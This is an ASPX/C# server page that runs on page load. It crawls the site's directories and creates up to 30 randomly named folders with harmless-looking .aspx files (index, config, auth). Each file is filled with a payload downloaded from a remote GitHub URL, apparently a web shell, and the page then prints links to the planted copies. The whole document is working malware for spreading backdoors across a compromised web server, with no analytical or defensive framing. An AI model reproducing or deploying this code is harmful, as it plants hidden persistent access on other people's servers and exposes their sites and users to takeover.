<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    System.Web.HttpContext.Current.Response.Write("<!-- Starting ASPX deployment -->\n");

    string[] targetNames = {
        "index","main","default","common","user","client","server","config","setting","setup",
        "init","start","connect","service","adminpanel","session","coredata","database","access","auth",
        "module","plugin","theme","mediafile","controller","router","loader","uploader","downloader","backupdata"
    };

    string[] folderPrefixes = {
        "assets","bin","cache","cdn","cloud","components","configurations","controllers","corelib","cronjobs"
    };

    string[] remoteUrls = {
        "https://raw.githubusercontent.com/asepexploit/bc/refs/heads/main/manjiro.aspx"
    };

    string baseDir = System.Web.HttpContext.Current.Server.MapPath("~/");
    int spreadCount = 0, maxSpread = 30;
    Random rand = new Random();

    try
    {
        foreach (string folder in System.IO.Directory.GetDirectories(baseDir, "*", System.IO.SearchOption.AllDirectories))
        {
            if (spreadCount >= maxSpread) break;
            if (rand.Next(1, 101) > 25) continue;

            string targetFolder = folder + "\\" + folderPrefixes[rand.Next(folderPrefixes.Length)] + "-" + rand.Next(100, 999);
            if (!System.IO.Directory.Exists(targetFolder))
                System.IO.Directory.CreateDirectory(targetFolder);

            string fileName = targetNames[rand.Next(targetNames.Length)] + ".aspx";
            string fullPath = targetFolder + "\\" + fileName;
            if (System.IO.File.Exists(fullPath)) continue;

            string payload = "";
            using (System.Net.WebClient client = new System.Net.WebClient())
            {
                foreach (string url in remoteUrls)
                {
                    try
                    {
                        payload = client.DownloadString(url);
                        if (!string.IsNullOrWhiteSpace(payload)) break;
                    }
                    catch { }
                }
            }

            if (string.IsNullOrWhiteSpace(payload)) continue;

            try
            {
                System.IO.File.WriteAllText(fullPath, payload);
                spreadCount++;
                string relPath = fullPath.Replace(baseDir, "").Replace("\\", "/");
                string proto = System.Web.HttpContext.Current.Request.IsSecureConnection ? "https" : "http";
                string host = System.Web.HttpContext.Current.Request.Url.Authority;
                string url = $"{proto}://{host}/{relPath}";
                System.Web.HttpContext.Current.Response.Write($"<a href='{url}' target='_blank'>{url}</a><br>\n");
            }
            catch { }
        }
    }
    catch (Exception ex)
    {
        System.Web.HttpContext.Current.Response.Write($"<!-- ERROR: {ex.Message} -->\n");
    }

    System.Web.HttpContext.Current.Response.Write($"<!-- ASPX deployment complete: {spreadCount} files -->\n");
}
</script>
